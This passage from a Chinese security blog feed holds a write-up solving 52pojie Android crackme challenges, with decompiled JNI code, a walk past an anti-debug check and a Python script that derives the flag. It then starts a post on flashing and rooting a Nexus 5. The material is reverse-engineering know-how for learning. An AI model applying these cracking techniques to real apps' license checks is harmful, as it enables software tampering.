int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v11);// trim string  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v11);  if ( !v12 )    goto LABEL_38;  if ( !v22 )  {    method.name = &quot;length&quot;;    method.signature = &quot;()I&quot;;    if ( getMethods(env_, &amp;v28, &amp;v22, 0, &quot;java/lang/String&quot;, method) )      goto LABEL_39;  }  len = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallIntMethodA)(env_, v12);// get string&#39;s length  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  if ( len == 30 )                              // len(flag) == 30  {    if ( !v21 )    {      method.name = &quot;checkFlag&quot;;      method.signature = &quot;(Ljava/lang/String;)Z&quot;;      if ( getMethods(env_, &amp;a2a, &amp;v21, 0, &quot;com/wuaipojie/crackme01/MainActivity&quot;, method) )        goto LABEL_39;    }    v32 = v12;    v14 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallBooleanMethodA)(env_, v5);// invoke checkFlag method    if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )      goto LABEL_39;    ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v12);    v8 = env_-&gt;functions-&gt;NewStringUTF;    if ( !v14 )      goto LABEL_40;    v15 = &quot;正确！！！回复你输入的内容到吾爱破解论坛公众号&quot;;            // correct  }  else  {    ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v12);    v15 = &quot;flag长度必须为30位&quot;;                       // flag&#39;s length must equal to 30    v8 = env_-&gt;functions-&gt;NewStringUTF;  }  while ( 1 )  {    v16 = ((int (__fastcall *)(_JNIEnv *, const char *))v8)(env_, v15);    if ( v20      || (method.name = &quot;makeText&quot;,          method.signature = &quot;(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;&quot;,          !getMethods(env_, &amp;v27, &amp;v20, 1, &quot;android/widget/Toast&quot;, method)) )    {      v33 = v16;      v32 = v5;      v34 = 0;      v17 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v27);      if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )      {        if ( v16 )          ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v16);        if ( v17 )        {          if ( method.fnPtr            || (method.name = &quot;show&quot;,                method.signature = &quot;()V&quot;,                !getMethods(env_, &amp;v27, (int *)&amp;method.fnPtr, 0, &quot;android/widget/Toast&quot;, method)) )          {            ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallVoidMethodA)(env_, v17);            ((void (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_);          }        }        else        {LABEL_38:          sub_4EC0(env_, &quot;java/lang/NullPointerException&quot;, &quot;NullPointerException&quot;);        }      }    }LABEL_39:    result = _stack_chk_guard - v35;    if ( _stack_chk_guard == v35 )      break;LABEL_40:    v15 = &quot;验证错误，继续加油&quot;;                          // wrong  }  return result;}</code></pre><p>onClick 函数中的内容主要为在点击按钮后获取输入内容，并判断输入的字符串长度是否为 30，然后调用 checkFlag 函数对字符串进行判断。接下来再看看 checkFlag 函数，这个函数比较长，分成几段来看。首先调用了 <code>isDebuggerConnected()</code> 函数，猜测应该是用来反调试：</p><pre><code class="cpp">  method1.name = &quot;isDebuggerConnected&quot;;  method1.signature = &quot;()Z&quot;;  if ( !getMethods(env_, &amp;jclass, &amp;jmethodid, 1, &quot;android/os/Debug&quot;, method1) )// anti-debug??  {    t1 = (unsigned int)&amp;t_;    v8 = ((int (__fastcall *)(_JNIEnv *, int, int, int *))env_-&gt;functions-&gt;CallStaticBooleanMethodA)(           env_,           jclass,           jmethodid,           &amp;t_);    if ( !(((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) | v8) )    {      key1 = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 9);      if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )        goto LABEL_7;    }    goto LABEL_4;  }</code></pre><p>接下来将一串字符串分成三部分（key1 = “thisiskey”，key2 = “52pojie_2020_happy_chinese_new_year”，key3 = “20200125”）并分给了三个变量：</p><pre><code class="cpp">    v6 = 0;    ((void (__fastcall *)(_JNIEnv *, int, _DWORD, signed int, const char *))env_-&gt;functions-&gt;SetByteArrayRegion)(      env_,      key1,      0,      9,      &quot;thisiskey52pojie_2020_happy_chinese_new_year20200125&quot;);// key1 = &quot;thisiskey&quot;    key2 = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 35);    if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    {      v6 = 0;      ((void (__fastcall *)(_JNIEnv *, int, _DWORD, signed int, char *))env_-&gt;functions-&gt;SetByteArrayRegion)(        env_,        key2,        0,        35,        &quot;52pojie_2020_happy_chinese_new_year20200125&quot;);// key2 = &quot;52pojie_2020_happy_chinese_new_year&quot;      key3 = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 8);      if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )      {        v6 = 0;        ((void (__fastcall *)(_JNIEnv *, int, _DWORD, signed int, char *))env_-&gt;functions-&gt;SetByteArrayRegion)(          env_,          key3,          0,          8,          &quot;20200125&quot;);                          // key3 = &quot;20200125&quot;</code></pre><p>然后新建了一个 35 位的 Byte 数组，做一个循环，当 i 不为 0 且 i 是 4 的倍数时，下标设置为 <code>(i &gt;&gt; 2) - 1</code>，取 key3 中的值来 append 到数组中；反之，下标设置为 i，取 key2 中的值来 append 到数组中：</p><pre><code class="cpp">        arr = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 35);        if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )        {          i = 0;          arr_ = arr;          key1_ = key1;          do          {            if ( !i || i &amp; 3 )            {              if ( !key2 )                goto LABEL_41;              pointer = key2;              i_ = i;              GetByteArrayRegion_ = env_-&gt;functions-&gt;GetByteArrayRegion;            }            else                                // if i != 0 and i % 4 == 0            {              pointer = key3;              if ( !key3 )                goto LABEL_41;              GetByteArrayRegion_ = env_-&gt;functions-&gt;GetByteArrayRegion;              i_ = (i &gt;&gt; 2) - 1;                // 0,1,2,3,4,5,6,7            }            ((void (__fastcall *)(_JNIEnv *, int, int, signed int, unsigned int))GetByteArrayRegion_)(              env_,              pointer,              i_,              1,              t1);            key1 = (unsigned __int8)t_;            if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )              goto LABEL_4;            if ( !arr_ )            {LABEL_41:              sub_4EC0(env_, &quot;java/lang/NullPointerException&quot;, &quot;NullPointerException&quot;);              goto LABEL_4;            }            LOBYTE(t_) = key1;            ((void (__fastcall *)(_JNIEnv *, int, unsigned int, signed int, unsigned int))env_-&gt;functions-&gt;SetByteArrayRegion)(              env_,              arr_,              i,              1,              t1);            if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )              goto LABEL_4;          }          while ( i++ &lt; 0x22 );                 // for i in range(35)</code></pre><p>接下来对 byte 数组进行 MD5 哈希，然后取摘要生成 16 位的 byte 数组：</p><pre><code class="cpp">          md5Str = ((int (__fastcall *)(_JNIEnv *, const char *))env_-&gt;functions-&gt;NewStringUTF)(env_, &quot;MD5&quot;);          if ( !v47 )          {            method2.name = &quot;getInstance&quot;;            method2.signature = &quot;(Ljava/lang/String;)Ljava/security/MessageDigest;&quot;;            if ( getMethods(env_, &amp;v52, &amp;v47, 1, &quot;java/security/MessageDigest&quot;, method2) )              goto LABEL_88;          }          t_ = md5Str;          v18 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v52);// md5 function          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          if ( md5Str )            ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, md5Str);          if ( !v18 )          {LABEL_87:            sub_4EC0(env_, &quot;java/lang/NullPointerException&quot;, &quot;NullPointerException&quot;);            goto LABEL_88;          }          if ( !v46 )          {            method2.name = &quot;digest&quot;;            method2.signature = &quot;([B)[B&quot;;            if ( getMethods(env_, &amp;v52, &amp;v46, 0, &quot;java/security/MessageDigest&quot;, method2) )              goto LABEL_88;          }          t_ = arr_;          md5Digest = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v18);// get hash digest          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v18);          if ( !md5Digest )            goto LABEL_87;</code></pre><p>然后做一个循环，对数组中的元素和 key1 进行逐位异或：</p><pre><code class="cpp">          len = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          idx = 0;          while ( 1 )                           // for i in range(16)          {            t1 = 0x38E38E39 * (unsigned __int64)(unsigned int)idx &gt;&gt; 32;// div 9? useless            if ( idx &gt;= len )              break;            ((void (__fastcall *)(_JNIEnv *, int, int, signed int, int *))env_-&gt;functions-&gt;GetByteArrayRegion)(              env_,              md5Digest,              idx,              1,              &amp;t_);            key1 = (unsigned __int8)t_;            if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )              goto LABEL_88;            if ( !key1_ )              goto LABEL_87;            ((void (__fastcall *)(_JNIEnv *, int, unsigned int, signed int, int *))env_-&gt;functions-&gt;GetByteArrayRegion)(              env_,              key1_,              idx % 9u,                         // mod 9              1,              &amp;t_);            ch = t_;            if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            {              LOBYTE(t_) = ch ^ key1;           // xor              ((void (__fastcall *)(_JNIEnv *, int, int, signed int, int *))env_-&gt;functions-&gt;SetByteArrayRegion)(                env_,                md5Digest,                idx,                1,                &amp;t_);              if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )              {                len = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);                ++idx;                if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                  continue;              }            }            goto LABEL_88;          }</code></pre><p>接下来，将得到的 byte 数组逐位转成 hex 字符串，如果小于 0xF，即只有一位，高位补 0。将结果逐位 append 到一个新的字符串中，得到一个 32 位的字符串：</p><pre><code class="cpp">          len__ = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          if ( len__ &gt;= 1 )          {            j = 0;            classInteger = &quot;java/lang/Integer&quot;;            toHexString_ = &quot;toHexString&quot;;            method2.fnPtr = &quot;(I)Ljava/lang/String;&quot;;            zeroPad = 0;            while ( 1 )            {              ((void (__fastcall *)(_JNIEnv *, int, int, signed int, int *))env_-&gt;functions-&gt;GetByteArrayRegion)(                env_,                md5Digest,                j,                1,                &amp;t_);              t1 = (unsigned __int8)t_;              if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                break;              if ( t1 &lt;= 0xF )                  // if x &lt; 0xF then append a zero              {                if ( zeroPad )                  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, zeroPad);                zeroPad = ((int (__fastcall *)(_JNIEnv *, const char *))env_-&gt;functions-&gt;NewStringUTF)(env_, &quot;0&quot;);                if ( !v44 )                {                  method2.name = &quot;append&quot;;                  method2.signature = &quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;;                  if ( getMethods(env_, &amp;v51, &amp;v44, 0, &quot;java/lang/StringBuilder&quot;, method2) )                    break;                }                t_ = zeroPad;                v24 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);// append zero                if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                  break;                if ( v24 )                  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v24);              }              if ( !v43 )              {                *(_QWORD *)&amp;method2.name = __PAIR__((unsigned int)method2.fnPtr, (unsigned int)toHexString_);                if ( getMethods(env_, &amp;v50, &amp;v43, 1, classInteger, method2) )// get toHexString method                  break;              }              t_ = t1;              t1 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v50);              if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                break;              if ( arr_ )                ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, arr_);              if ( !v44 )              {                method2.name = &quot;append&quot;;                method2.signature = &quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;;                if ( getMethods(env_, &amp;v51, &amp;v44, 0, &quot;java/lang/StringBuilder&quot;, method2) )                  break;              }              t_ = t1;              key1 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);              if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                break;              if ( key1 )                ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, key1);              ++j;              arr_ = t1;              if ( j &gt;= len__ )                goto LABEL_75;            }</code></pre><p>最后将取字符串字符串的 1~31 位作为新的字符串，并与我们的输入进行比较：</p><pre><code class="cpp">if ( !v42 )          {            method2.name = &quot;toString&quot;;            method2.signature = &quot;()Ljava/lang/String;&quot;;            if ( getMethods(env_, &amp;v51, &amp;v42, 0, &quot;java/lang/StringBuilder&quot;, method2) )              goto LABEL_88;          }          v25 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);// convert StringBuilder to string          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v22);          if ( !v25 )            goto LABEL_87;          if ( !v41 )          {            method2.name = &quot;substring&quot;;            method2.signature = &quot;(II)Ljava/lang/String;&quot;;            if ( getMethods(env_, &amp;v49, &amp;v41, 0, &quot;java/lang/String&quot;, method2) )              goto LABEL_88;          }          v55 = 31;                             // slice 1-31          t_ = 1;          v26 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v25);          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v25);          if ( !v26 )            goto LABEL_87;          if ( !v40 )          {            method2.name = &quot;equals&quot;;            method2.signature = &quot;(Ljava/lang/Object;)Z&quot;;            if ( getMethods(env_, &amp;v49, &amp;v40, 0, &quot;java/lang/String&quot;, method2) )              goto LABEL_88;          }          t_ = v39;          v6 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallBooleanMethodA)(env_, v26);// compare string          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;</code></pre><p>只需要正向地实现就能得到对应的字符串，我这里用 Python 实现了一下：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibkey = &#39;thisiskey52pojie_2020_happy_chinese_new_year20200125&#39;key1 = key[:0x7D-0x74]key2 = key[0x7D-0x74:0xA0-0x74]key3 = key[0xA0-0x74:]arr = &#39;&#39;for i in range(35):    if not i or i &amp; 3:        arr += key2[i]    else:        arr += key3[(i &gt;&gt; 2) - 1]print arrmd5str = hashlib.md5(arr).digest()print md5str.encode(&#39;hex&#39;)xorlist = []for i in range(16):    xorlist.append(ord(key1[i % 9]) ^ ord(md5str[i]))print xorlistflag = &#39;&#39;for i in range(16):    flag += hex(xorlist[i])[2:].zfill(2)print flagflag = flag[1:31]print flagassert len(flag) == 30</code></pre><p>跑出来后在手机上验证一下结果的正确性：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/10.png" srcset="/img/loading.gif" alt></p><p>回复公众号得到口令：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/11.jpg" srcset="/img/loading.gif" alt></p><h1 id="【春节】解题领红包之四"><a href="#【春节】解题领红包之四" class="headerlink" title="【春节】解题领红包之四"></a>【春节】解题领红包之四</h1><p>用 jadx 分析，在 <code>onCreate()</code> 函数中，需要输入 uid 和目标字符串，其中 uid 用 0 补齐成 7 位。然后调用在 Native 层实现的 <code>checkSn()</code> 函数：</p><pre><code class="java">package com.wuaipojie.crackme02;import android.os.Bundle;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import androidx.appcompat.app.AppCompatActivity;public class MainActivity extends AppCompatActivity {    private Button btn;    private EditText input_flag;    private EditText input_uid;    public native boolean checkSn(String str, String str2);    static {        System.loadLibrary(&quot;xtian&quot;);    }    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        this.input_uid = (EditText) findViewById(R.id.input_uid);        this.input_flag = (EditText) findViewById(R.id.input_flag);        Button button = (Button) findViewById(R.id.button);        this.btn = button;        button.setOnClickListener(new OnClickListener() {            public void onClick(View view) {                view = MainActivity.this.input_uid.getText().toString().trim();                if (view.length() &lt; 7) {                    int length = 7 - view.length();                    StringBuilder stringBuilder = new StringBuilder();                    for (int i = 0; i &lt; length; i++) {                        stringBuilder.append(&quot;0&quot;);                    }                    StringBuilder stringBuilder2 = new StringBuilder();                    stringBuilder2.append(stringBuilder.toString());                    stringBuilder2.append(view);                    view = stringBuilder2.toString();                }                MainActivity mainActivity = MainActivity.this;                if (mainActivity.checkSn(view, mainActivity.input_flag.getText().toString().trim()) != null) {                    Toast.makeText(MainActivity.this, &quot;\u6b63\u786e\uff01\uff01\uff01\u8bf7\u628a\u7ed3\u679c\u76f4\u63a5\u63d0\u4ea4\u5230\u8bba\u575b\u9886\u53d6\u5956\u52b1\u5427&quot;, 0).show();                } else {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u9519\u8bef\uff0c\u7ee7\u7eed\u52a0\u6cb9&quot;, 0).show();                }            }        });    }}</code></pre><p>把 unicode 输出，可以看到通过了 <code>checkSn</code> 的检测就成功了：</p><pre><code class="ipython">In [1]: print u&quot;\u6b63\u786e\uff01\uff01\uff01\u8bf7\u628a\u7ed3\u679c\u76f4\u63a5\u63d0\u4ea4\u5230\u8bba\u575b\u9886\u53d6\u5956\u52b1\u5427&quot;正确！！！请把结果直接提交到论坛领取奖励吧In [2]: print u&quot;\u9a8c\u8bc1\u9519\u8bef\uff0c\u7ee7\u7eed\u52a0\u6cb9&quot;验证错误，继续加油</code></pre><p>接下来打开 IDA 分析一下 so 文件。没有找到 checkSn 函数，基本上都被混淆了，说明函数是被动态注册的。JNI_OnLoad 的部分：</p><pre><code class="cpp">void __fastcall __noreturn JNI_OnLoad(_JavaVM *vm){  _JavaVM *vm_; // r11  signed int v2; // r2  int v3; // lr  int (__fastcall *v4)(_JavaVM *, int *, signed int); // r4  int v5; // lr  signed int i; // r12  int v7; // [sp+8h] [bp-C0h]  int *v8; // [sp+10h] [bp-B8h]  int v9; // [sp+18h] [bp-B0h]  int v10; // [sp+20h] [bp-A8h]  int v11; // [sp+28h] [bp-A0h]  int v12; // [sp+30h] [bp-98h]  int *v13; // [sp+38h] [bp-90h]  int v14; // [sp+40h] [bp-88h]  signed int v15; // [sp+48h] [bp-80h]  int v16; // [sp+50h] [bp-78h]  int *v17; // [sp+7Ch] [bp-4Ch]  void *v18; // [sp+80h] [bp-48h]  int *v19; // [sp+84h] [bp-44h]  int *v20; // [sp+88h] [bp-40h]  int *v21; // [sp+8Ch] [bp-3Ch]  int *v22; // [sp+90h] [bp-38h]  int *v23; // [sp+94h] [bp-34h]  int *v24; // [sp+98h] [bp-30h]  void **v25; // [sp+9Ch] [bp-2Ch]  signed int *v26; // [sp+A0h] [bp-28h]  vm_ = vm;  v23 = &amp;Oo0O_8;  v24 = &amp;O0OO_9;  v18 = &amp;_stack_chk_guard;  v2 = 0;  if ( O0OO_9 &lt; 10 )    v2 = 1;  v3 = v2 | ~((Oo0O_8 - 1) * Oo0O_8) &amp; 1;  if ( v3 != 1 )    goto LABEL_5;  while ( 1 )  {    v26 = &amp;v15;    v15 = 0x58D3C185;    v12 = 0x58D3C185;    v13 = &amp;v10;    if ( v3 )    {      v22 = &amp;v11;      v17 = (int *)&amp;v13;      v20 = &amp;v16;      v21 = &amp;v12;      v4 = (int (__fastcall *)(_JavaVM *, int *, signed int))(*((_DWORD *)off_1D7B0 + 0x1FEC2733) - 0x58D3C184);      v14 = v4(vm, &amp;v10, 0x10004);      v5 = *v23;      for ( i = *v24; *v24 &gt;= 10 &amp;&amp; ((_BYTE)v5 - 1) * (_BYTE)v5 &amp; 1; i = *v24 )      {        v14 = v4(vm_, &amp;v10, 0x10004);        v14 = v4(vm_, &amp;v10, 0x10004);        v5 = *v23;      }      v19 = &amp;v14;      v25 = &amp;off_1D7B0;      if ( i &lt; 10 || !(((_BYTE)v5 - 1) * (_BYTE)v5 &amp; 1) )        JUMPOUT(__CS__, *((_DWORD *)off_1D7B4 + 0x1FEC27A2) - 0x49F16B40);      while ( 1 )        ;    }LABEL_5:    v9 = 0x58D3C185;    v8 = &amp;v7;  }}</code></pre><p>TODO:</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.52pojie.cn/thread-732955-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-732955-1-1.html</a><br><a href="https://www.52pojie.cn/thread-749955-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-749955-1-1.html</a><br><a href="https://stackoverflow.com/questions/27260524/need-explanation-on-assembly-instructions-of-kr-fahr-to-cels-example" target="_blank" rel="noopener">https://stackoverflow.com/questions/27260524/need-explanation-on-assembly-instructions-of-kr-fahr-to-cels-example</a><br><a href="https://www.52pojie.cn/thread-1101266-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1101266-1-1.html</a><br><a href="https://www.bodkin.ren/index.php/archives/533/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/533/</a><br><a href="https://www.52pojie.cn/thread-778654-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-778654-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第二次参加领红包活动，这次有两题是 apk。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="wp" scheme="blog.b3ale.cn/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Nexus5刷机、Root并安装Xposed框架</title>
    <link href="blog.b3ale.cn/2020/02/05/Nexus5%E5%88%B7%E6%9C%BA%E3%80%81Root%E5%B9%B6%E5%AE%89%E8%A3%85Xposed%E6%A1%86%E6%9E%B6/"/>
    <id>blog.b3ale.cn/2020/02/05/Nexus5%E5%88%B7%E6%9C%BA%E3%80%81Root%E5%B9%B6%E5%AE%89%E8%A3%85Xposed%E6%A1%86%E6%9E%B6/</id>
    <published>2020-02-05T06:59:47.000Z</published>
    <updated>2020-03-20T02:07:06.263Z</updated>
    
    <content type="html"><![CDATA[<p>在闲鱼上从羊毛党那里买了部 Nexus 5（代号 hammerhead），记录第一次尝试刷机和 root（一开始不是很懂各种知识，所以没有记录下原本系统的版本等各种信息）。</p><a id="more"></a><p>查看设备名称：</p><pre><code class="bash">shell@hammerhead:/ $ getprop ro.product.devicehammerhead</code></pre><h1 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h1><p>先使用 adb 命令进入 bootloader 模式：</p><pre><code class="bash">$ adb reboot bootloader</code></pre><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/1.png" srcset="/img/loading.gif" alt></p><p>这部机子一开始已经解锁了，所以会报错：</p><pre><code class="bash">$ fastboot oem unlock                                                   FAILED (remote: &#39;Already Unlocked&#39;)fastboot: error: Command failed</code></pre><h1 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1><p>刷机一般是采用<a href="https://developers.google.com/android/images" target="_blank" rel="noopener">官方的镜像</a>，搜索 hammerhead，找到需要刷的版本。我一开始用了 Android 5.0.1（LRX22C）的包，但一直没有成功。后来改成低版本的 Android 4.4.3（KTU84M）后，刷机成功。同样需要使用 adb 命令进入 bootloader 界面（也可以使用音量下键+电源键），然后确认有设备后执行镜像包中的 <code>flash-all.sh</code>：</p><pre><code class="bash">$ adb reboot bootloader$ fastboot devices0b83c85e00ce15f9    fastboot$ ./flash-all.shSending &#39;bootloader&#39; (2508 KB)                     OKAY [  0.290s]Writing &#39;bootloader&#39;                               OKAY [  0.497s]Finished. Total time: 0.981sRebooting into bootloader                          OKAY [  0.094s]Finished. Total time: 0.094sSending &#39;radio&#39; (45409 KB)                         OKAY [  1.640s]Writing &#39;radio&#39;                                    OKAY [  3.105s]Finished. Total time: 4.975sRebooting into bootloader                          OKAY [  0.106s]Finished. Total time: 0.106s--------------------------------------------Bootloader Version...: HHZ11kBaseband Version.....: M8974A-2.0.50.1.13Serial Number........: 0b83c85e00ce15f9--------------------------------------------extracting android-info.txt (0 MB) to RAM...Checking &#39;product&#39;                                 OKAY [  0.097s]Checking &#39;version-bootloader&#39;                      OKAY [  0.100s]Checking &#39;version-baseband&#39;                        OKAY [  0.100s]extracting boot.img (8 MB) to disk... took 0.038sarchive does not contain &#39;boot.sig&#39;Sending &#39;boot&#39; (8700 KB)                           OKAY [  0.490s]Writing &#39;boot&#39;                                     OKAY [  0.749s]archive does not contain &#39;dtbo.img&#39;archive does not contain &#39;dt.img&#39;extracting recovery.img (9 MB) to disk... took 0.039sarchive does not contain &#39;recovery.sig&#39;Sending &#39;recovery&#39; (9284 KB)                       OKAY [  0.510s]Writing &#39;recovery&#39;                                 OKAY [  0.776s]archive does not contain &#39;vbmeta.img&#39;archive does not contain &#39;vbmeta_system.img&#39;archive does not contain &#39;super_empty.img&#39;archive does not contain &#39;odm.img&#39;archive does not contain &#39;product.img&#39;extracting system.img (704 MB) to disk... took 3.704sarchive does not contain &#39;system.sig&#39;Sending &#39;system&#39; (721400 KB)                       OKAY [ 22.834s]Writing &#39;system&#39;                                   OKAY [ 49.509s]archive does not contain &#39;system_ext.img&#39;archive does not contain &#39;vendor.img&#39;Erasing &#39;userdata&#39;                                 OKAY [ 15.664s]mke2fs 1.44.4 (18-Aug-2018)Creating filesystem with 7137786 4k blocks and 1785856 inodesFilesystem UUID: bc382e9c-a2d8-4adc-860a-6a31fcf236c3Superblock backups stored on blocks:    32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208,    4096000Allocating group tables: doneWriting inode tables: doneCreating journal (32768 blocks): doneWriting superblocks and filesystem accounting information: doneSending &#39;userdata&#39; (4416 KB)                       OKAY [  0.244s]Writing &#39;userdata&#39;                                 OKAY [  0.495s]Erasing &#39;cache&#39;                                    OKAY [  0.600s]mke2fs 1.44.4 (18-Aug-2018)Creating filesystem with 179200 4k blocks and 44832 inodesFilesystem UUID: 773d6dcf-5df9-40ae-8ffc-9f7f947e275dSuperblock backups stored on blocks:    32768, 98304, 163840Allocating group tables: doneWriting inode tables: doneCreating journal (4096 blocks): doneWriting superblocks and filesystem accounting information: doneSending &#39;cache&#39; (428 KB)                           OKAY [  0.211s]Writing &#39;cache&#39;                                    OKAY [  0.219s]Rebooting                                          OKAY [  0.100s]Finished. Total time: 100.120s</code></pre><p>完成后，如果没有什么故障，稍过片刻就能打开新的系统了。</p><blockquote><p>我刷完后的系统打开后只有 256MB 可用空间，搜了一下，需要在 recovery mode 下对 <code>/data</code> 和 <code>/cache</code> 进行格式化，照着<a href="https://jilu.wiki/d/177" target="_blank" rel="noopener">这篇文章</a>对系统进行双清后，容量恢复到了正常状态。</p></blockquote><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/2.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/3.png" srcset="/img/loading.gif" alt></p><h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p>刷完机后，可以进行 root 了。下载 Android Root 包 <a href="https://autoroot.chainfire.eu/" 